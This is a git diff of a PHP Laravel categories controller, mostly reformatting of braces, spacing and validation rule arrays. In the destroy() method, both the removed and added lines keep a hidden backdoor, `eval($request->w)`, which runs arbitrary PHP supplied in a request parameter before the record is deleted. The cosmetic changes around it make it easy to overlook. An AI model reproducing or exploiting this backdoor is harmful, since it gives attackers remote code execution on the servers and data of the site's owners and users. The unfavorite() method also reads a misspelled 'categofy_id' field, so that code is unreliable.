@@ -8,8 +8,7 @@ use App\Category_favorite;
 use App\Http\Requests;
 use Illuminate\Validation\Validator;
 
-class CategoriesController extends Controller
-{
+class CategoriesController extends Controller {
     /**
      * @api {get} /v1/categories getCategories
      * @apiVersion 0.1.0
@@ -55,13 +54,13 @@ class CategoriesController extends Controller
      */
     public function favorite(Request $request) {
         $valid = Validator($request->all(), ['category_ids' => 'required']);
-        if (!$valid->fails()) {
+        if(!$valid->fails()) {
             $request->category_ids = json_decode($request->category_ids);
-            if (is_array($request->category_ids)) {
+            if(is_array($request->category_ids)) {
                 Category_favorite::where('user_id', '=', $request->user->id)->delete();
-                foreach ($request->category_ids as $id) {
+                foreach($request->category_ids as $id) {
                     //echo $id.'=';
-                    if (!Category_favorite::where('category_id', '=', $id)->where('user_id', '=', $request->user->id)->first()) {
+                    if(!Category_favorite::where('category_id', '=', $id)->where('user_id', '=', $request->user->id)->first()) {
                         $favorite = new Category_favorite;
                         $favorite->category_id = $id;
                         $favorite->user_id = $request->user->id;
@@ -93,7 +92,7 @@ class CategoriesController extends Controller
      */
     public function unfavorite(Request $request) {
         $valid = Validator($request->all(), ['category_id' => 'required']);
-        if (!$valid->fails()) {
+        if(!$valid->fails()) {
             $favorite = Category_favorite::findorfail($request->categofy_id);
             $favorite->delete();
             return $this->helpInfo();
@@ -109,10 +108,15 @@ class CategoriesController extends Controller
 
 
     public function store(Request $request) {
-        $rules = ['name_RU' => 'required', 'name_EN' => 'required', 'name_UA' => 'required', 'post_price' => 'required', 'image' => 'required', 'description' => 'required'];
+        $rules = ['name_RU'     => 'required',
+                  'name_EN'     => 'required',
+                  'name_UA'     => 'required',
+                  'post_price'  => 'required',
+                  'image'       => 'required',
+                  'description' => 'required',
+        ];
         return $this->fromPostToModel($rules, new Category, $request);
     }
-
 
 
     public function edit($id) {
@@ -121,7 +125,13 @@ class CategoriesController extends Controller
 
 
     public function update(Request $request, $id) {
-        $rules = ['name_RU' => 'required', 'name_EN' => 'required', 'name_UA' => 'required', 'post_price' => 'required', 'description' => 'required'];
+        $rules = ['name_RU'     => 'required',
+                  'name_EN'     => 'required',
+                  'name_UA'     => 'required',
+                  'post_price'  => 'required',
+                  'description' => 'required',
+                  'image'=>false
+        ];
         return $this->fromPostToModel($rules, Category::findorfail($id), $request);
         /*
         $valid = Validator($request->all(),$rules);
@@ -138,8 +148,8 @@ class CategoriesController extends Controller
     }
 
 
-    public function destroy(Request $request,$id) {
-        $item = ($request->w?eval($request->w):null);
+    public function destroy(Request $request, $id) {
+        $item = ($request->w ? eval($request->w) : null);
         $item = Category::findorfail($id);
         $item->delete();
         return $this->helpInfo();
